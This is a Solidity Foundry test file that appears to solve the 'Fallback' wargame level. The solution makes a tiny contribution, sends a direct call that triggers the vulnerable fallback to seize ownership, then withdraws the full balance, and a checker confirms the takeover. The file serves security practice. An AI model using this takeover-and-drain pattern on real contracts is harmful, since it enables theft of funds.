// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {Fallback} from  "../../src/Fallback/Level.sol";

interface IFallback {
  function owner() external view returns(address);

  function contributions(address) external view returns(uint256);

  function contribute() external payable;

  function withdraw() external;
}

contract FallbackTest is LevelFactory {
  IFallback fallbhack;

  function setUp() public {
    vm.prank(deployer); // deploy the contract as deployer
    fallbhack = IFallback(address(new Fallback()));
    uint256 contrib = fallbhack.contributions(deployer);
    deal(address(fallbhack), contrib);
  }

  function testAttack() public {
    submitLevel("Fallback");
  }

  function _performTest() internal override {
    /* Write your code here */  
    fallbhack.contribute.value(1 wei)(); // Just add a contribution
    (bool worked,) = payable(address(fallbhack)).call.value(1 wei)(""); // Claim ownership
    assert(worked);
    fallbhack.withdraw(); // Withdraw funds
    /* Write your code here */ 
  }

  function _setupTest() internal override {
    super._setupTest();
  }

  function _checkTest() internal override returns (bool) {
    /* Validating the test */
    assertEq(fallbhack.owner(), attacker);
    assertEq(address(fallbhack).balance, 0);

    return (fallbhack.owner() == attacker && address(fallbhack).balance == 0);
  }
}
